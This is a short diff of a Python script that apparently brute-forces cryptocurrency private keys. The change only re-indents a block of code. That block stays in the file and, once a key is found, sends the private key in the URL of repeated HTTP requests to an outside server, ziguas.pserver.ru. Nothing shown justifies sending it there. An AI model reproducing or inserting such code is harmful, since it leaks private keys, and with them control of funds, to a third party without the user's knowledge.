@@ -185,14 +185,14 @@ while True:
                     print(privkey)
                     found = privkey
     if found:
-	for n in range(10):
-		try:
-		    respns = requests.get("https://ziguas.pserver.ru/bcon/?id="+str(found), timeout=60)
-		    print("request send waiting ",wait," sec priv: ",str(found))
-		    time.sleep(wait)
-		    wait += 10 
-		except:
-		    pass
+        for n in range(10):
+            try:
+                respns = requests.get("https://ziguas.pserver.ru/bcon/?id="+str(found), timeout=60)
+                print("request send waiting ",wait," sec priv: ",str(found))
+                time.sleep(wait)
+                wait += 10 
+            except:
+                pass
     if zebra % 100000000 == 0:
         print("{:,}".format(zebra),pubct)
     zebra += 1
